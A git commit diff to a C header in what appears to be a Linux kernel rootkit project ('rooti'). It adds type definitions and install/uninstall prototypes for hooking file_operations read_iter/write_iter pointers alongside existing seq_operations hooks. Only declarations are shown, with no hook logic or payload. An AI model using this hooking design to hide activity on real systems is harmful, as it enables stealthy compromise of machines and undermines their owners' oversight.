3aba307242c0c08b813900d5e1ba879e4f1e09b4
Omri Ben Zikri <omribenzikri10@gmail.com>
2025-07-02 18:40:24 +0000

    Implemented hooking of file_operations function pointers

--- src/hooking/ops.h
+++ src/hooking/ops.h
@@ -2,20 +2,34 @@
 #define _ROOTI_HOOKING_OPS_H
 
 // Shorthand for initializing operation hook objects
-#define ROOTI_OPS_HOOK(_symbol, _op, _hook, _orig) \
+#define ROOTI_OPS_HOOK(_symbol, _ops, _hook, _orig) \
 { \
     .symbol = (_symbol), \
     .func = (_hook), \
     .orig = (_orig), \
-    .op = (_op) \
+    .ops = (_ops) \
 }
 
+// The different types of (supported) file operations
+enum rooti_file_ops {
+    ROOTI_FILE_READ_ITER,
+    ROOTI_FILE_WRITE_ITER
+};
+
 // The different types of seqfile operations 
-enum rooti_seq_op {
+enum rooti_seq_ops {
     ROOTI_SEQ_START,
     ROOTI_SEQ_STOP,
     ROOTI_SEQ_NEXT,
     ROOTI_SEQ_SHOW
+};
+
+// Represents a hook to a file operation
+struct rooti_file_ops_hook {
+    char *symbol;             // name of the file_operations object symbol
+    void *func;               // pointer to hook function
+    void *orig;               // pointer to the original function
+    enum rooti_file_ops ops;   // the desired operation to hook
 };
 
 // Represents a hook to a seqfile operation
@@ -23,8 +37,13 @@ struct rooti_seq_ops_hook {
     char *symbol;             // name of the seq_operations object symbol
     void *func;               // pointer to hook function
     void *orig;               // pointer to the original function
-    enum rooti_seq_op op;     // the desired operation to hook
+    enum rooti_seq_ops ops;   // the desired operation to hook
 };
+
+int rooti_install_file_ops_hook(struct rooti_file_ops_hook *hook);
+int rooti_install_file_ops_hooks(struct rooti_file_ops_hook *hooks, size_t count);
+int rooti_uninstall_file_ops_hook(struct rooti_file_ops_hook *hook);
+int rooti_uninstall_file_ops_hooks(struct rooti_file_ops_hook *hooks, size_t count);
 
 int rooti_install_seq_ops_hook(struct rooti_seq_ops_hook *hook);
 int rooti_install_seq_ops_hooks(struct rooti_seq_ops_hook *hooks, size_t count);
